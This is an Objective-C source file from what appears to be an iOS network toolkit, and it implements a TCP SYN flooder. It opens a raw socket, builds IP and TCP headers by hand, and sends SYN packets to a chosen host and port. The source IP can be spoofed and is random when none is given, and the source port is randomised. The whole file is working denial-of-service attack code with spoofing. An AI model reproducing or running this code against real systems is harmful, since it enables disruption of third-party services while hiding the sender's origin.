//
//  IJTTCP-Flooding.m
//  IJTTCP Flooding
//
//  Created by 聲華 陳 on 2015/9/8.
//
//

#import "IJTTCP-Flooding.h"
#import <netinet/tcp.h>
#import "IJTSysctl.h"
#import <sys/socket.h>
#import <netinet/ip.h>
#import <netdb.h>
#import <arpa/inet.h>
#import <netinet/in.h>
#import <netinet/in_systm.h>
#import <sys/sysctl.h>

@interface IJTTCP_Flooding ()

@property (nonatomic) int sockfd;
@property (nonatomic, strong) NSString *hostname;
@property (nonatomic) struct sockaddr_in sin;
@property (nonatomic) u_int16_t dst_port;

@end

#define MAXDATA 1024
struct packet_tcp {
    struct ip ip;
    struct tcphdr tcp;
    unsigned char data[MAXDATA];
};

@implementation IJTTCP_Flooding

- (id)init {
    self = [super init];
    if(self) {
        self.sockfd = -1;
        [self open];
    }
    return self;
}

- (void)open {
    int n = 1, len, maxbuf = -1;
    
    if(self.sockfd < 0) {
        self.sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(self.sockfd < 0)
            goto BAD;
    }
    
    //custom ip header
    if (setsockopt(self.sockfd, IPPROTO_IP, IP_HDRINCL, &n, sizeof(n)) < 0)
        goto BAD;
    
    //enable broadcast
    n = 1;
    if (setsockopt(self.sockfd, SOL_SOCKET, SO_BROADCAST, &n, sizeof(n)) < 0)
        goto BAD;
    
    //send buffer
    len = sizeof(n);
    maxbuf = 1024*1024;
    
    if (getsockopt(self.sockfd, SOL_SOCKET, SO_SNDBUF, &n, (socklen_t *)&len) < 0)
        goto BAD;
    
    for (n += 1024; n <= maxbuf; n += 1024) {
        if (setsockopt(self.sockfd, SOL_SOCKET, SO_SNDBUF, &n, len) < 0) {
            if (errno == ENOBUFS)
                break;
            goto BAD;
        }
    }
    
    //receive buffer
    len = sizeof(n);
    maxbuf = 1024*1024;
    
    if (getsockopt(self.sockfd, SOL_SOCKET, SO_RCVBUF, &n, (socklen_t *)&len) < 0)
        goto BAD;
    
    for (n += 1024; n <= maxbuf; n += 1024) {
        if (setsockopt(self.sockfd, SOL_SOCKET, SO_RCVBUF, &n, len) < 0) {
            if (errno == ENOBUFS)
                break;
            goto BAD;
        }
    }

    
    self.errorHappened = NO;
    return;
    
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    [self close];
    return;
}

- (void)dealloc {
    [self close];
}

- (void)close {
    if(self.sockfd >= 0) {
        close(self.sockfd);
        self.sockfd = -1;
    }
}

- (int)setTarget: (NSString *)target
 destinationPort: (u_int16_t)port {
    struct hostent *hp;
    char hnamebuf[MAXHOSTNAMELEN];
    
    _dst_port = port;
    //clear
    memset(&_sin, 0, sizeof(_sin));
    _sin.sin_family = AF_INET;
    _sin.sin_len = sizeof(_sin);
    
    //resolve hostname
    if (inet_aton([target UTF8String], &_sin.sin_addr) != 0) { //ip address
        self.hostname = target;
    }
    else {//hostname
        hp = gethostbyname2([target UTF8String], AF_INET);
        if (!hp)
            goto HOSTBAD;
        if ((unsigned)hp->h_length > sizeof(_sin.sin_addr))
            goto HOSTBAD;
        
        memcpy(&_sin.sin_addr, hp->h_addr_list[0], sizeof _sin.sin_addr);
        (void)strncpy(hnamebuf, hp->h_name, sizeof(hnamebuf) - 1);
        hnamebuf[sizeof(hnamebuf) - 1] = '\0';
        self.hostname = [NSString stringWithUTF8String:hnamebuf];
    }
    
OK:
    self.errorHappened = NO;
    return 0;
HOSTBAD:
    self.errorCode = h_errno;
    self.errorHappened = YES;
    return -2;
}

- (int)floodingSourceIpAddress: (NSString *)sourceIpAddress
                    sourcePort: (u_int16_t)sourcePort
                        target: (id)target
                      selector: (SEL)selector
                        object: (id)object {
    in_addr_t src_ip = 0;
    struct packet_tcp send;
    ssize_t size;
    TCPFloodingCallback tcpfloodingcallback = NULL;
    
    if(target && selector) {
        tcpfloodingcallback = (TCPFloodingCallback)[target methodForSelector:selector];
    }
    
    if(sourcePort == 0) {
        //49152–65535
        sourcePort = arc4random()%(65535-49152+1)+(49152);
    }
    
    if(sourceIpAddress != nil) {
        inet_pton(AF_INET, [sourceIpAddress UTF8String], &src_ip);
    }
    else {
        do {
            src_ip = arc4random();
        } while(src_ip == INADDR_ANY || src_ip == INADDR_BROADCAST);
    }
    
    memset(&send, 0, sizeof send);
    int datalen = 0;
    int iplen = datalen + (sizeof send.ip) + (sizeof send.tcp);
    make_tcp_header(&send,
                    src_ip, sourcePort,
                    _sin.sin_addr.s_addr, _dst_port,
                    0, 0, datalen);
    make_ip_header(&(send.ip), src_ip, _sin.sin_addr.s_addr, iplen);
    
    if ((size = sendto(_sockfd, (char *)&send, iplen, 0, (struct sockaddr *) &_sin, sizeof(_sin))) < 0) {
        goto BAD;
    }
    if(size != iplen)
        goto BAD;
    
    char ntop_buf[256];
    inet_ntop(AF_INET, &src_ip, ntop_buf, sizeof(ntop_buf));
    
    if(tcpfloodingcallback) {
        tcpfloodingcallback(target, selector, _hostname, _dst_port, [NSString stringWithUTF8String:ntop_buf], sourcePort, object);
    }
    else {
        NSLog(@"%@ %d %@ %d", _hostname, _dst_port, [NSString stringWithUTF8String:ntop_buf], sourcePort);
    }
    
    self.errorHappened = NO;
    return 0;
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    return -1;
    
}

static u_int16_t checksum(u_int16_t *data, int len) {
    u_int32_t sum = 0;
    
    for (; len > 1; len -= 2) {
        sum += *data++;
        if (sum & 0x80000000)
            sum = (sum & 0xffff) + (sum >> 16);
    }
    
    if (len == 1) {
        u_int16_t i = 0;
        *(u_char*) (&i) = *(u_char *) data;
        sum += i;
    }
    
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    
    return ~sum;
}

static void make_tcp_header(struct packet_tcp *packet, int src_ip, int src_port,
                     int dst_ip, int dst_port, int seq, int ack, int datalen) {
    packet->tcp.th_seq   = htonl(seq);
    packet->tcp.th_ack   = htonl(ack);
    packet->tcp.th_sport = htons(src_port);
    packet->tcp.th_dport = htons(dst_port);
    packet->tcp.th_off   = 5;
    packet->tcp.th_flags = TH_SYN;
    packet->tcp.th_win   = arc4random();
    packet->tcp.th_urp   = htons(0);
    
    packet->ip.ip_ttl    = 0;
    packet->ip.ip_p      = IPPROTO_TCP;
    packet->ip.ip_src.s_addr = src_ip;
    packet->ip.ip_dst.s_addr = dst_ip;
    packet->ip.ip_sum    = htons((sizeof packet->tcp) + datalen);
    
#define PSEUDO_HEADER_LEN 12
    packet->tcp.th_sum = 0;
    packet->tcp.th_sum = checksum((u_int16_t *) &(packet->ip.ip_ttl),
                                  PSEUDO_HEADER_LEN + (sizeof packet->tcp)
                                  + datalen);
}

static void make_ip_header(struct ip *ip, int src_ip, int dst_ip, int iplen) {
    ip->ip_v   = IPVERSION;
    ip->ip_hl  = sizeof (struct ip) >> 2;
    ip->ip_id  = 0;
    ip->ip_len = iplen;
    ip->ip_off = IP_DF;
    ip->ip_ttl = 255;
    ip->ip_p   = IPPROTO_TCP;
    ip->ip_src.s_addr = src_ip;
    ip->ip_dst.s_addr = dst_ip;
    
    ip->ip_sum = 0;
    ip->ip_sum = checksum((u_int16_t *) ip, sizeof ip);
}
@end
